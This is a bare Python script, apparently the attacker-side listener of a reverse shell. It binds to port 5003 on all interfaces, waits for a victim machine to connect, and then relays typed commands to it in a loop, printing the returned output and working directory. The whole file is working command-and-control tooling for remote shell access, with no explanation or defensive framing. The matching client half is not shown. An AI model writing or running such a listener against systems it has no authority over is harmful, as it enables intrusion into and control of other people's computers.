import socket

host = "0.0.0.0"
port = 5003
buff = 1024 * 128 
separator = "<sep>"

s = socket.socket()
s.bind((host, port))
s.listen(5)
print(f"Listening as {host}:{port} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected")

cwd = client_socket.recv(buff).decode()
print("[+] Current working directory:", cwd)

while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    output = client_socket.recv(buff).decode()
    results, cwd = output.split(separator)
    print(results)